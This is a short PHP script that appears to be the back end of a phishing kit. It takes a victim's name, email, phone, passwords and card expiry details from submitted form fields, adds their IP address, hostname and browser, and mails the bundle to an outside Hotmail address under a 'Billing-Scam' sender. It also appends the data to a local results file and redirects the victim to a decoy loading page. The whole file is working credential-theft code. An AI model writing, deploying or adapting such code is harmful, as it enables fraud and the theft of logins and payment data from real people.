<?php
$ip = getenv("REMOTE_ADDR");
$xpanama .= "====================+| shipping address |+==========================\n";
$xpanama .= "name            : ".$_POST['name']."\n";
$xpanama .= "em            : ".$_POST['em']."\n";
$xpanama .= "te             : ".$_POST['te']."\n";
$xpanama .= "ps               : ".$_POST['ps']."\n";
$xpanama .= "pss               : ".$_POST['pss']."\n";



$xpanama .= "====================+| good luck  |+==========================\n";

$xpanama .= " IP                        : $ip\n";
$xpanama .= " HOST               : ".gethostbyaddr($ip)."\n";
$xpanama .= " BROWSER            : ".$_SERVER['HTTP_USER_AGENT']."\n";
$cc = $_POST['ccn'];
$subject = "❤❤❤jak email 🎁❤❤❤".$_POST['exm']."/".$_POST['exy'];
$send = "lovlywatchs@hotmail.com";
$headers = "From:  || Billing-Scam || <pa@naa.ma>\r\n";
mail($send,$subject,$xpanama,$headers);
$file = fopen("../my-rzlt/rzlt.txt", 'a');
fwrite($file, $xpanama);
header("Location: ../loding.html?RTK1NuCP6dc-6KUJRY8DvNGzmdBeVfZCivTQ532rKp_GaUoKyqCF2e7UQ6KU8OWplk&fref=nf");?>